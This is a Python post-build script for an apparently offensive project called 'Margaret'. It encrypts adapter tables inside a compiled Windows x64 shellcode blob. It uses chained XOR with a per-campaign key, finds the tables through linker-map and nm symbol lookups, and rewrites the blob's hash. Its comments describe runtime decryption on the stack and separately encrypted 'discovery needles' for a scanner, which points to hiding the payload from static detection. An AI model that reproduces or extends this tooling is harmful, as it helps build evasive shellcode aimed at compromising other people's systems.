#!/usr/bin/env python3
"""encrypt_blob.py — post-build encryption for Margaret.

Encrypts the adapter tables in bin/shellcode.bin (chained-XOR with a
per-campaign key from scripts/hash_seed).  The blob's runtime
adapter_decrypt() restores each table into a stack buffer before
selection.  Run AFTER `make shellcode` (gates must pass on the plaintext blob first):

    python3 scripts/encrypt_blob.py

Algorithm (mirrors src/adapter.c adapter_decrypt):
    key = initial
    for i, p in enumerate(plain):
        c = p ^ key
        out[i] = c
        key = (key + c + i) & 0xFF
"""

import json
import pathlib
import re
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent


def chained_xor(data: bytes, key: int) -> bytes:
    out = bytearray(len(data))
    for i, b in enumerate(data):
        c = b ^ key
        out[i] = c
        key = (key + c + i) & 0xFF
    return bytes(out)


def main() -> int:
    # load campaign seeds
    cfg = json.loads((ROOT / "scripts/hash_seed").read_text())
    fnv = int(cfg["fnv_seed"], 16)
    djb = int(cfg["djb_seed"], 16)
    akey = (fnv >> 3) & 0xFF  # adapter XOR key
    bkey = ((fnv ^ djb) >> 7) & 0xFF  # blob XOR key
    campaign = cfg.get("campaign", "?")

    blob_path = ROOT / "bin/shellcode.bin"
    if not blob_path.exists():
        print("[enc] bin/shellcode.bin not found; run make shellcode first")
        return 1

    data = blob_path.read_bytes()
    print(f"[enc] blob: {len(data)} bytes, campaign={campaign}")
    print(f"[enc] adapter key: {akey:#04x}, blob key: {bkey:#04x}")

    # find .text$R offset+size from the linker map
    map_path = ROOT / "build/map/margaret.x64.map"
    if not map_path.exists():
        print("[enc] linker map not found; run make shellcode first")
        return 1
    map_text = map_path.read_text()
    m = re.search(r"\.text\$R\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)", map_text)
    if not m:
        print("[enc] .text$R not found in linker map")
        return 1
    rodata_off = int(m.group(1), 16)
    rodata_size = int(m.group(2), 16)
    print(f"[enc] .text$R at offset {rodata_off:#x}, {rodata_size} bytes")

    # --- Layer 1: encrypt ONLY the adapter symbols, each independently
    # (192 bytes, key reset per table — mirrors adapter_decrypt).
    # .text$R also carries the discovery needles, which are ALREADY
    # encrypted at compile time (scripts/gen_needles.py, different key):
    # re-encrypting them would corrupt the scanner.  Exact addresses come
    # from the linked image symbol table. ---
    import shutil, subprocess
    ADAPTER_SIZE = 192
    image = ROOT / "build/margaret.x64.exe"
    nm = shutil.which("x86_64-w64-mingw32-nm") or "nm"
    sym_out = subprocess.run([nm, str(image)], capture_output=True,
                             text=True, check=True).stdout
    adapters = sorted(int(m.group(1), 16) for m in
                      re.finditer(r"^([0-9a-f]+)\s+t\s+margaret_adapter_\w+$",
                                  sym_out, re.M))
    if not adapters:
        raise SystemExit("[enc] no margaret_adapter_* symbols in image")
    enc = bytearray(data)
    for addr in adapters:
        enc[addr : addr + ADAPTER_SIZE] = chained_xor(
            data[addr : addr + ADAPTER_SIZE], akey)
    blob_path.write_bytes(bytes(enc))
    digest = __import__("hashlib").sha256(bytes(enc)).hexdigest()
    (ROOT / "bin/shellcode.sha256").write_text(f"{digest}  shellcode.bin\n")
    print(f"[enc] sha256 updated: {digest}")
    print(f"[enc] L1: {len(adapters)} adapters encrypted independently "
          f"at {[hex(a) for a in adapters]}")


    return 0


if __name__ == "__main__":
    sys.exit(main())
